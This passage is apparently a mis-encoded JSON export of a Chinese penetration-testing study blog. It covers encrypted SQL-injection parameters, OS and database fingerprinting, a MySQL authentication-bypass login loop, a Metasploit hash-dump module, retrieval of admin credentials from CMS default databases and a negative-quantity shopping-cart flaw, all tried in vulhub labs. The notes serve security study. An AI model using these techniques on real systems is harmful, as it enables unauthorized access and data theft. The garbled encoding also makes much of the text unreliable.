phpæ–‡ä»¶æ˜¯ä¸€ä¸ªè§£å¯†çš„è„šæœ¬ï¼Œçœ‹æ¥è¿™ä¸ªå°±æ˜¯è§£å¯†è„šæœ¬ã€‚ å› ä¸ºæœ‰ä¿©æ¬¡base64åŠ å¯†ï¼Œæ‰€æœ‰éœ€è¦å…ˆè§£å¯†ä¸€æ¬¡ å†æ¬¡è§£å¯†ï¼Œé€šè¿‡ä¸Šé¢è§£å¯†è„šæœ¬å°±å¯ä»¥çœ‹å‡ºæ˜¯AESåŠ å¯†ï¼Œæ‰€ä»¥ç›´æ¥åˆ°AESä¸­è¿›è¡Œè§£å¯†ã€‚AESåŠ å¯†æ¨¡å¼ï¼šCBCã€æ•°æ®å—ï¼š128ä½ã€å¯†ç ï¼šydhaqPQnexoaDuW3ã€åç§»é‡ï¼š2018201920202021è§£å¯†å¾—å‡ºï¼š1_mozhe ä¹‹åå¯ä»¥çœ‹åˆ°å°†_mozheåˆ é™¤å°±æ˜¯1ï¼Œæ‰€æœ‰å‚æ•°å°±æ˜¯1 ä¹‹åæˆ‘ä»¬é€šè¿‡è¿™æ ·çš„åŠ å¯†æ¨¡å¼å°±å¯ä»¥å†™å…¥æˆ‘ä»¬çš„å‚æ•°äº†ã€‚ è¿™é‡Œæˆ‘ä»¥1â€™ and 1=1 â€“+ä¸ºä¾‹ å†æ¬¡è¿›è¡Œbase64åŠ å¯† æœ€åç»“æœ 1MHk4MWZ6TjArWlVSQ1hHVkUrZVdPdz09","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"05åŸºç¡€å…¥é—¨--ç³»ç»ŸåŠæ•°æ®åº“","slug":"05åŸºç¡€å…¥é—¨-ç³»ç»ŸåŠæ•°æ®åº“","date":"2021-09-21T02:25:55.000Z","updated":"2021-09-21T06:06:05.925Z","comments":true,"path":"2021/09/21/05åŸºç¡€å…¥é—¨-ç³»ç»ŸåŠæ•°æ®åº“/","link":"","permalink":"https://al0nez.github.io/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€é™¤å»å‰æœŸçš„æ­å»ºå¹³å°ä¸­é—´ä»¶ï¼Œç½‘ç«™æºç ç­‰ï¼Œå®¹æ˜“å—åˆ°æ”»å‡»çš„è¿˜æœ‰æ“ä½œç³»ç»Ÿæ•°æ®åº“ï¼Œç¬¬ä¸‰æ–¹è½¯ä»¶å¹³å°ç­‰ã€‚å…¶ä¸­æ­¤ç±»æ”»å‡»ä¹Ÿèƒ½ç›´æ¥å½±å“åˆ°WEBæˆ–æœåŠ¡å™¨çš„å®‰å…¨ï¼Œå¯¼è‡´ç½‘ç«™æˆ–æœåŠ¡å™¨æƒé™çš„è·å–ã€‚ é™¤å»å¸¸è§„WEBå±‚é¢ä»¥åŠAPPå®‰å…¨å¤–ï¼Œç±»ä¼¼æœåŠ¡å™¨å•ä¸€æˆ–è€…å¤æ‚çš„å…¶ä»–æœåŠ¡ï¼Œæ¸¸æˆï¼Œè´Ÿè½½å‡è¡¡ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®‰å…¨æµ‹è¯•ç›®æ ‡ï¼Œæ­¤ç±»ç›®æ ‡æµ‹è¯•åŸåˆ™åªæ˜¯ä¸ºäº†WEBåº”ç”¨æˆ–è€…å…¶ä»–å®‰å…¨é—®é¢˜ã€‚ æ“ä½œç³»ç»Ÿå±‚é¢è¯†åˆ«æ“ä½œç³»ç»Ÿå¸¸è§æ–¹æ³•windowså¯¹å¤§å°å†™ä¸æ•æ„Ÿï¼Œæ— è®ºå¤§å°å†™éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè€Œlinuxå¯¹å¤§å°å†™æ•æ„Ÿã€‚ è¿™ä¸ªç½‘ç«™æ˜¯windowsçš„ è¿™ä¸ªç½‘ç«™å°±æ˜¯linuxçš„ åˆ©ç”¨TTLæ¥è¿›è¡Œç½‘ç«™æ“ä½œç³»ç»Ÿè¯†åˆ«ï¼Œè¿™ä¸ªä¸å¤ªå‡†ç¡® ä¸åŒçš„æ“ä½œç³»ç»Ÿçš„é»˜è®¤TTLå€¼æ˜¯ä¸åŒçš„ï¼Œ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡TTLå€¼æ¥åˆ¤æ–­ä¸»æœºçš„æ“ä½œç³»ç»Ÿï¼Œä½†æ˜¯å½“ç”¨æˆ·ä¿®æ”¹äº†TTLå€¼çš„æ—¶å€™ï¼Œå°±ä¼šè¯¯å¯¼æˆ‘ä»¬çš„åˆ¤æ–­ï¼Œæ‰€ä»¥è¿™ç§åˆ¤æ–­æ–¹å¼ä¹Ÿä¸ä¸€å®šå‡†ç¡®ã€‚ä¸‹é¢æ˜¯é»˜è®¤æ“ä½œç³»ç»Ÿçš„TTLï¼š 123451ã€WINDOWS NT/2000 TTLï¼š1282ã€WINDOWS 95/98 TTLï¼š323ã€UNIX TTLï¼š2554ã€LINUX TTLï¼š645ã€WIN7 TTLï¼š64 åˆ©ç”¨nmapè¿›è¡Œè¯†åˆ« 1nmap -O ipåœ°å€ ç®€è¿°ä¸¤è€…åŒºåˆ«ä»¥åŠè¯†åˆ«çš„æ„ä¹‰1.ç½‘ç«™è·¯å¾„åŒºåˆ« 2.å¤§å°å†™åŒºåˆ« 3.æ–‡ä»¶åœ¨linuxå’Œwindowsçš„é€‚ç”¨æ€§ é€šè¿‡åˆ¤æ–­æ“ä½œç³»ç»Ÿï¼Œä»åˆé€‚ä»–çš„æ¼æ´è¿›è¡Œåˆ©ç”¨ æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´ç±»å‹å¯¹åº”æ„ä¹‰æ°¸ç—•ä¹‹è“ å¯èƒ½ä¼šé€ æˆè®¡ç®—æœºå´©æºƒï¼Œè·å–åˆ°å¯¹åº”shellã€‚ ç®€è¦æ“ä½œç³»ç»Ÿå±‚é¢æ¼æ´å½±å“èŒƒå›´è·å–ç›¸åº”æƒé™ï¼ŒæŸäº›æœåŠ¡å´©æºƒï¼Œè®¡ç®—æœºå´©æºƒ æ•°æ®åº“å±‚é¢é™æ€ç½‘ç«™æ˜¯æ²¡æœ‰æ¼æ´çš„ï¼ŒåŠ¨æ€ç½‘ç«™æ‰æœ‰æ¼æ´ è¯†åˆ«æ•°æ®åº“ç±»å‹å¸¸è§æ–¹æ³• å°å‹æ•°æ®åº“ Access ä¸­å‹æ•°æ®åº“ MySQL å¤§å‹æ•°æ®åº“ Oracleã€SQL Server 1.é€šè¿‡ç½‘ç«™è¯†åˆ«æ•°æ®åº“ å¸¸è§æ­å»ºç»„åˆ 12345ASP+Accessï¼Œsql server ï¼ˆwindowsï¼‰PHP+Mysqlï¼ˆlinuxã€windowsï¼‰ ç«¯å£ï¼š3306ASPX+Mssql(windows) ç«¯å£ï¼š1433Jsp+Mssqlï¼ˆwindowsï¼‰,oracle ï¼ˆlinuxã€windowsï¼‰ç«¯å£ï¼š1521Python+Mongodb ï¼ˆlinuxã€windowsï¼‰ 2.åˆ©ç”¨ç«¯å£æ‰«æè¯†åˆ«æ•°æ®åº“ 1234567891011Oracle 1521MySql 3306SQLServer 1433MongoDB 27017Redis 6379memcached 11211psotgreSQL 5432db2 5000Derby 1521pgsql 5432ponitbase 9092 æ•°æ®åº“ç±»å‹åŒºåˆ«åŠè¯†åˆ«æ„ä¹‰æ•°æ®åº“ä¸åŒï¼Œç»“æ„ä¹Ÿä¸åŒã€‚äº§ç”Ÿçš„æ¼æ´ä¹Ÿä¸åŒï¼Œæ”»å‡»æ‰‹æ³•ä¹Ÿä¸åŒ æ•°æ®åº“å¸¸è§æ¼æ´ç±»å‹åŠæ”»å‡»å¼±å£ä»¤ï¼Œé€šè¿‡å¼±å£ä»¤è·å–adminè´¦æˆ·å¯†ç ã€‚ ç®€è¦æ•°æ®åº“å±‚é¢æ¼æ´å½±å“èŒƒå›´é€šè¿‡æ¼æ´ï¼Œè¿›è¡Œæ”»å‡»ï¼Œä¹Ÿå¯ä»¥è·å–æ•°æ®åº“çš„ç›¸å…³æƒé™ï¼Œè¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œ ç¬¬ä¸‰æ–¹å±‚é¢å¸¸è§ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼š Jbossï¼ŒPHPmyadminï¼Œvsftpdï¼Œteamviewç­‰ å¦‚ä½•åˆ¤æ–­æœ‰å“ªäº›ç¬¬ä¸‰æ–¹å¹³å°å’Œè½¯ä»¶é€šè¿‡nmapç«¯å£æ‰«ææ¥åˆ¤æ–­ã€‚ ç®€è¿°ä¸ºä»€ä¹ˆè¦è¯†åˆ«ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶é€šè¿‡è¯†åˆ«ç¬¬ä¸‰æ–¹è½¯ä»¶ï¼Œæ¥æ‰¾å‡ºæ¼æ´ï¼Œä»è€Œè¿›è¡Œæ¸—é€æµ‹è¯• å¸¸è§ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶æ¼æ´ç±»å‹åŠæ”»å‡»å¼±å£ä»¤æ”»å‡»ã€æ¼æ´æ”»å‡» ç®€è¿°ç¬¬ä¸‰æ–¹å¹³å°æˆ–è½¯ä»¶å®‰å…¨æµ‹è¯•çš„èŒƒå›´å½±å“æƒé™ è¡¥å……é™¤å»å¸¸è§WEBå®‰å…¨åŠAPPå®‰å…¨æµ‹è¯•å¤–ï¼Œç±»ä¼¼æœåŠ¡å™¨å•ä¸€æˆ–å¤æ‚çš„å…¶ä»–æœåŠ¡ï¼ˆé‚®ä»¶ã€æ¸¸æˆã€è´Ÿè½½å‡è¡¡ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå®‰å…¨æµ‹è¯•ç›®æ ‡ï¼Œæ­¤ç±»ç›®æ ‡æµ‹è¯•åŸåˆ™åªæ˜¯å°‘äº†WEBåº”ç”¨æˆ–å…¶ä»–å®‰å…¨é—®é¢˜ã€‚æ‰€ä»¥æ˜ç¡®å®‰å…¨æµ‹è¯•æ€è·¯æ˜¯å¾ˆé‡è¦çš„ï¼ æ¡ˆä¾‹æ¼”ç¤ºæŸæ•°æ®åº“å¼±å£ä»¤åŠæ¼æ´æ¼”ç¤º1234docker-compose up -ddocker network ls æŸ¥çœ‹å½“å‰dockerç½‘ç»œdocker network rm 592a344d1cbb åˆ é™¤æŸä¸€ä¸ªdockerç½‘ç»œ æ³¨ï¼šå…¶ä¸­ NAMEä¸ºbridgeã€hostã€noneä¸ºå†…ç½®çš„dockerç½‘ç»œï¼Œæ— æ³•åˆ é™¤ 1for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done æˆåŠŸç™»å½•åˆ°æ•°æ®åº“ã€‚ å…³é—­å®¹å™¨ 1docker-compose down å¦ä¸€ç§æ–¹å¼ 12msfconsoleuse auxiliary/scanner/mysql/mysql_authbypass_hashdump 123set rhosts 10.6.25.48set threads 10run æŸç¬¬ä¸‰æ–¹åº”ç”¨å®‰å…¨æ¼æ´æ¼”ç¤º1docker-compose up -d bpæŠ“ä¸€ä¸‹åŒ… æˆåŠŸåˆ©ç”¨","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"04åŸºç¡€å…¥é—¨--WEBæºç æ‹“å±•","slug":"04åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•","date":"2021-09-21T02:25:25.000Z","updated":"2021-09-21T06:06:10.200Z","comments":true,"path":"2021/09/21/04åŸºç¡€å…¥é—¨-WEBæºç æ‹“å±•/","link":"","permalink":"https://al0nez.github.io/2021/09/21/04%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-WEB%E6%BA%90%E7%A0%81%E6%8B%93%E5%B1%95/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å‰è¨€WEBæºç åœ¨å®‰å…¨æµ‹è¯•ä¸­æ˜¯éå¸¸é‡è¦çš„ä¿¡æ¯æ¥æºï¼Œå¯ä»¥ç”¨æ¥ä»£ç å®¡è®¡æ¼æ´ä¹Ÿå¯ä»¥ç”¨æ¥åšä¿¡æ¯çªç ´å£ï¼Œå…¶ä¸­WEBæºç æœ‰å¾ˆå¤šæŠ€æœ¯éœ€è¦ç®€æ˜åˆ†æã€‚æ¯”å¦‚:è·å–æŸ ASPæºç åå¯ä»¥é‡‡ç”¨é»˜è®¤æ•°æ®åº“ä¸‹è½½ä¸ºçªç ´ï¼Œè·å–æŸå…¶ä»–è„šæœ¬æºç æ¼æ´å¯ä»¥è¿›è¡Œä»£ç å®¡è®¡æŒ–æ˜æˆ–åˆ†æå…¶ä¸šåŠ¡é€»è¾‘ç­‰ï¼Œæ€»ä¹‹æºç çš„è·å–å°†ä¸ºåæœŸçš„å®‰å…¨æµ‹è¯•æä¾›äº†æ›´å¤šçš„æ€è·¯ã€‚ å…³äº WEB æºç ç›®å½•ç»“æ„æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œåå°ç›®å½•ï¼Œæ¨¡ç‰ˆç›®å½•ï¼Œæ•°æ®åº“ç›®å½•ç­‰ å…³äº WEB æºç è„šæœ¬ç±»å‹ASP,PHP,ASPX,JSP,JAVAWEB ç­‰è„šæœ¬ç±»å‹æºç å®‰å…¨é—®é¢˜ å…³äº WEB æºç åº”ç”¨åˆ†ç±»ç¤¾äº¤ï¼Œè®ºå›ï¼Œé—¨æˆ·ï¼Œç¬¬ä¸‰æ–¹ï¼Œåšå®¢ç­‰ä¸åŒçš„ä»£ç æœºåˆ¶å¯¹åº”æ¼æ´ å…³äº WEB æºç å…¶ä»–è¯´æ˜å¼€æºï¼Œæœªå¼€æºé—®é¢˜ï¼Œæ¡†æ¶éæ¡†æ¶é—®é¢˜ï¼Œå…³äº CMS è¯†åˆ«é—®é¢˜åŠåç»­ç­‰ å…³äºæºç è·å–çš„ç›¸å…³é€”å¾„æœç´¢ï¼Œå’¸é±¼æ·˜å®ï¼Œç¬¬ä¸‰æ–¹æºç ç«™ï¼Œå„ç§è¡Œä¸šå¯¹åº” æ€»ç»“å…³æ³¨åº”ç”¨åˆ†ç±»åŠè„šæœ¬ç±»å‹ä¼°æ‘¸å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼ˆå…¶ä¸­æ¡†æ¶ç±»ä¾‹å¤–ï¼‰ï¼Œåœ¨è·å–æºç åå¯è¿›è¡Œæœ¬åœ°å®‰å…¨æµ‹è¯•æˆ–ä»£ç å®¡è®¡ï¼Œä¹Ÿå¯ä»¥åˆ†æå…¶ç›®å½•å·¥ä½œåŸç†ï¼ˆæ•°æ®åº“å¤‡ä»½ï¼Œbak æ–‡ä»¶ç­‰ï¼‰ï¼Œæœªè·å–åˆ°çš„æºç é‡‡ç”¨å„ç§æ–¹æ³•æƒ³åŠæ³•è·å–ï¼ æ¼”ç¤ºæ¡ˆä¾‹ASP,PHP ç­‰æºç ä¸‹å®‰å…¨æµ‹è¯•12å¹³å°è¯†åˆ«-æŸCMSæ— æ¼æ´-é»˜è®¤æ•°æ®åº“å¹³å°è¯†åˆ«-æŸCMSæœ‰æ¼æ´-æ¼æ´åˆ©ç”¨ é€šè¿‡åç¼€æˆ‘ä»¬æ¸…æ¥šçœ‹çš„åˆ°æ—¶aspåç¼€ï¼Œè¯´æ˜æ˜¯aspç½‘ç«™ã€‚ å¯ä»¥æ¸…æ¥šçš„çœ‹åˆ°XYcmsçš„å­—æ ·ï¼Œè¯´æ˜ç”¨çš„cmsæ˜¯xycmsã€‚ ä¸‹è½½XYCMSæºç  æ‰¾åˆ°ä»–çš„æ•°æ®åº“æ–‡ä»¶ æ‰“å¼€æ•°æ®åº“æ–‡ä»¶å‘ç°è¯¥æ–‡ä»¶é‡Œæœ‰ç®¡ç†å‘˜è´¦å·å¯†ç  è®¿é—®ç½‘ç«™åå° æ‰‹å·¥è¯†åˆ«CMS metinfoCMS æœç´¢ç›¸å…³æ¼æ´ å­—å…¸è¯†åˆ«å­—å…¸ ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶ã€‚ æŸ¥çœ‹å…¶md5 1certutil -hashfile æ–°å»ºæ–‡æœ¬æ–‡æ¡£.txt MD5 å¦ä¸€ç§ä¸‹è½½æ–‡ä»¶ é€šè¿‡è¿…é›·ä¸‹è½½ åœ¨çº¿CMSè¯†åˆ«http://whatweb.bugscaner.com/look/ https://www.yunsee.cn/ æºç å¼•ç”¨åˆ†ç±»ä¸‹çš„é’ˆå¯¹æ¼æ´1niushopç”µå•†ç±»å…³æ³¨æ¼æ´ç‚¹-ä¸šåŠ¡é€»è¾‘ æŸ¥çœ‹ç”µå•†ç½‘ç«™ä¸šåŠ¡é€»è¾‘ æŠ“åŒ… æ­£å¸¸å‘å‡º å°†numä¿®æ”¹ä¸º-1 å¯ä»¥çœ‹åˆ°éœ€è¦æ”¯ä»˜0å…ƒï¼Œç›´æ¥ç™½å«– ç®€è¦ç›®æ ‡ä»è¯†åˆ«åˆ°æºç è·å–æœ¬åœ°æ¼”ç¤ºä¸ªäººåšå®¢-æ‰‹å·¥å‘ç°å…¶CMS-æ¼æ´æœç´¢æˆ–ä¸‹è½½åˆ†æ æœç´¢ç‰¹æ®Šå…³é”®å­—ï¼Œè¯†åˆ«cms http:weipan.1016sangshen.cn/ å†…éƒ¨æ­å»ºçš„é¶åœº äººå·¥çˆ†æ¡†æ¶-æœç´¢ç‰¹å®šURL-è·å–å…¶ä»–ç›¸ç¬¦ç«™ç‚¹-æ¼æ´æµ‹è¯• é€šè¿‡æŠ¥é”™å‘ç°CMSï¼Œå‘ç°æ˜¯thinkphp æœç´¢thinkphpçš„æ¼æ´ å€ŸåŠ©ç‰¹å®šè¡Œä¸šæºç æˆ–å’¸é±¼è¿›è¡Œæœç´¢è·å–-æœ¬åœ°æ­å»º-ä»£ç å®¡è®¡æˆ–å…¶ä»–","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"03åŸºç¡€å…¥é—¨--æ­å»ºå®‰å…¨æ‹“å±•","slug":"03åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•","date":"2021-09-21T02:24:58.000Z","updated":"2021-09-21T06:06:14.759Z","comments":true,"path":"2021/09/21/03åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•/","link":"","permalink":"https://al0nez.github.io/2021/09/21/03%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%90%AD%E5%BB%BA%E5%AE%89%E5%85%A8%E6%8B%93%E5%B1%95/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† å¸¸è§æ­å»ºå¹³å°ï¼ˆä¸­é—´ä»¶ï¼‰è„šæœ¬å¯ç”¨ASP,PHP,ASPX,JSP,PY,JAVAWEBç­‰ç¯å¢ƒ åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜åŸŸåè®¿é—®çš„æ˜¯è¯¥ç½‘ç«™çš„æ ¹ç›®å½•ï¼Œè€ŒIPæ˜¯ä»åŸŸåçš„ä¸Šä¸€çº§å¼€å§‹è®¿é—®çš„ã€‚æ‰«æç›®å½•çš„æ—¶å€™ï¼Œæ‰«æIPä¼šå¤šæ‰«å‡ºä¸€äº›ä¸œè¥¿ å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨ç½‘ç«™å¯èƒ½å¯¹ä¸€äº›æ–‡ä»¶çš„åç¼€åæ‰§è¡Œé”™è¯¯ å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤1.é™åˆ¶å¤–éƒ¨æˆå‘˜è®¿é—®å†…éƒ¨ç½‘ç«™ï¼Œé™åˆ¶IPåœ°å€è§„èŒƒè®¿é—®æƒé™ 2.èº«ä»½éªŒè¯å’Œè®¿é—®æ§åˆ¶ å¦‚æœå–æ¶ˆåŒ¿åè®¿é—®ï¼Œéœ€è¦è®¿é—®è€…è¾“å‡ºç”¨æˆ·åå’Œå¯†ç æ‰èƒ½è®¿é—®ã€‚ 3.é™åˆ¶IPåœ°å€è®¿é—® å¯ä»¥é€šè¿‡é™åˆ¶è¿è¡ŒæŸä¸€IPè®¿é—®ç½‘ç«™ï¼Œæˆ–è€…æ‹’ç»æŸä¸ªIPè®¿é—®ç½‘ç«™ã€‚ WEBæºç ä¸­æ•æ„Ÿæ–‡ä»¶åå°è·¯å¾„ï¼Œæ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå¤‡ä»½æ–‡ä»¶ç­‰ WEB åé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™1.æ¥å®¾ç”¨æˆ·ä¸€èˆ¬æ˜¯ç½‘ç«™æƒé™ç”¨æˆ·ï¼Œç¦æ­¢æ¥å®¾ç”¨æˆ·æƒé™ï¼Œå¯¼è‡´è¿æ¥åé—¨çœ‹ä¸åˆ°ä»»ä½•ä¸œè¥¿ã€‚ 2.é€šè¿‡å°†ç›®å½•çš„è¯»å†™æƒé™ä¸­çš„å†™å…¥æƒé™æ‹’ç»ï¼Œä½¿æˆ‘ä»¬è™½ç„¶ç”¨åé—¨è¿æ¥æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰å†™å…¥çš„æƒé™ã€‚è§£å†³æ–¹æ³•æ˜¯æ¢ä¸€ä¸ªç›®å½•è¿›è¡Œå†™å…¥ã€‚ æ¼”ç¤ºæ¡ˆä¾‹åŸºäºä¸­é—´ä»¶çš„ç®€è¦è¯†åˆ«é€šè¿‡æŠ“åŒ…æŸ¥çœ‹ä¸­é—´ä»¶ åŸºäºä¸­é—´ä»¶çš„å®‰å…¨æ¼æ´ ç›¸å…³ç»ƒä¹ å¹³å° www.vulhub.org https://www.vulnhub.com/ vulhubé¶åœºå¼€å¯ 12sudo docker-compose buildsudo docker-compose up -d å…³é—­ 1sudo docker-compose down","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"02åŸºç¡€å…¥é—¨--æ•°æ®åŒ…æ‹“å±•","slug":"02åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•","date":"2021-09-12T08:48:57.000Z","updated":"2021-09-21T06:06:25.733Z","comments":true,"path":"2021/09/12/02åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•/","link":"","permalink":"https://al0nez.github.io/2021/09/12/02%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%8B%93%E5%B1%95/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† ç½‘ç«™è§£æå¯¹åº”ç®€è¦ç½‘ç«™æ­å»ºè¿‡ç¨‹https://www.cnblogs.com/GodSince/p/12010184.html æ¶‰åŠåˆ°çš„æ”»å‡»å±‚é¢ï¼Ÿæºç ï¼Œæ­å»ºå¹³å°ï¼Œç³»ç»Ÿï¼Œç½‘ç»œå±‚ç­‰ æ¶‰åŠåˆ°çš„å®‰å…¨é—®é¢˜ï¼Ÿç›®å½•ï¼Œæ•æ„Ÿæ–‡ä»¶ï¼Œå¼±å£ä»¤ï¼ŒIP åŠåŸŸåç­‰ HTTP/Sæ•°æ®åŒ…Requestè¯·æ±‚æ•°æ®åŒ… Responseè¿”å›æ•°æ®åŒ… Requestè¯·æ±‚æ•°æ®åŒ… Proxyä»£ç†æœåŠ¡å™¨ Responseè¿”å›æ•°æ®åŒ… å…³äºHTTPå’ŒHTTPSHTTPï¼ˆHyperText Transfer Protocolï¼šè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºåˆ†å¸ƒå¼ã€åä½œå¼å’Œè¶…åª’ä½“ä¿¡æ¯ç³»ç»Ÿçš„åº”ç”¨å±‚åè®®ã€‚ ç®€å•æ¥è¯´å°±æ˜¯ä¸€ç§å‘å¸ƒå’Œæ¥æ”¶ HTML é¡µé¢çš„æ–¹æ³•ï¼Œè¢«ç”¨äºåœ¨ Web æµè§ˆå™¨å’Œç½‘ç«™æœåŠ¡å™¨ä¹‹é—´ä¼ é€’ä¿¡æ¯ã€‚ HTTP é»˜è®¤å·¥ä½œåœ¨ TCP åè®® 80 ç«¯å£ï¼Œç”¨æˆ·è®¿é—®ç½‘ç«™ http:// æ‰“å¤´çš„éƒ½æ˜¯æ ‡å‡† HTTP æœåŠ¡ã€‚ HTTP åè®®ä»¥æ˜æ–‡æ–¹å¼å‘é€å†…å®¹ï¼Œä¸æä¾›ä»»ä½•æ–¹å¼çš„æ•°æ®åŠ å¯†ï¼Œå¦‚æœæ”»å‡»è€…æˆªå–äº†Webæµè§ˆå™¨å’Œç½‘ç«™æœåŠ¡å™¨ä¹‹é—´çš„ä¼ è¾“æŠ¥æ–‡ï¼Œå°±å¯ä»¥ç›´æ¥è¯»æ‡‚å…¶ä¸­çš„ä¿¡æ¯ï¼Œå› æ­¤ï¼ŒHTTPåè®®ä¸é€‚åˆä¼ è¾“ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚ï¼šä¿¡ç”¨å¡å·ã€å¯†ç ç­‰æ”¯ä»˜ä¿¡æ¯ã€‚ HTTPSï¼ˆHypertext Transfer Protocol Secureï¼šè¶…æ–‡æœ¬ä¼ è¾“å®‰å…¨åè®®ï¼‰æ˜¯ä¸€ç§é€è¿‡è®¡ç®—æœºç½‘ç»œè¿›è¡Œå®‰å…¨é€šä¿¡çš„ä¼ è¾“åè®®ã€‚HTTPS ç»ç”± HTTP è¿›è¡Œé€šä¿¡ï¼Œä½†åˆ©ç”¨ SSL/TLS æ¥åŠ å¯†æ•°æ®åŒ…ã€‚HTTPS å¼€å‘çš„ä¸»è¦ç›®çš„ï¼Œæ˜¯æä¾›å¯¹ç½‘ç«™æœåŠ¡å™¨çš„èº«ä»½è®¤è¯ï¼Œä¿æŠ¤äº¤æ¢æ•°æ®çš„éšç§ä¸å®Œæ•´æ€§ã€‚ HTTPS é»˜è®¤å·¥ä½œåœ¨ TCP åè®®443ç«¯å£ï¼Œå®ƒçš„å·¥ä½œæµç¨‹ä¸€èˆ¬å¦‚ä»¥ä¸‹æ–¹å¼ï¼š 1ã€TCP ä¸‰æ¬¡åŒæ­¥æ¡æ‰‹ 2ã€å®¢æˆ·ç«¯éªŒè¯æœåŠ¡å™¨æ•°å­—è¯ä¹¦ 3ã€DH ç®—æ³•åå•†å¯¹ç§°åŠ å¯†ç®—æ³•çš„å¯†é’¥ã€hash ç®—æ³•çš„å¯†é’¥ 4ã€SSL å®‰å…¨åŠ å¯†éš§é“åå•†å®Œæˆ 5ã€ç½‘é¡µä»¥åŠ å¯†çš„æ–¹å¼ä¼ è¾“ï¼Œç”¨åå•†çš„å¯¹ç§°åŠ å¯†ç®—æ³•å’Œå¯†é’¥åŠ 